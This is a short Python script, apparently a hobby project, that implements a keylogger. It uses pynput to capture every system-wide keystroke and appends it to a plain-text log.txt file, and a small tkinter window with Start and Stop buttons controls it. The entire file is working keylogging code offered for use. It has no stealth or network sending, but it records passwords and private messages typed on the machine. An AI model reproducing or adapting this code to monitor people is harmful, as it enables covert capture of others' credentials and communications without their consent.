from pynput import keyboard
import tkinter as tk

keylogger_listener = None 

def on_press(key):
    try:
        key_char = key.char
        with open('log.txt', 'a') as file:
            file.write(key_char + '\n')
    except AttributeError:
        key_name = str(key).replace("Key.", "<") + ">"
        with open('log.txt', 'a') as file:
            file.write(key_name + '\n')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    global keylogger_listener
    keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keylogger_listener.start()

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None

root = tk.Tk()
root.title("Keylogger")

start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack()

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack()

root.mainloop()
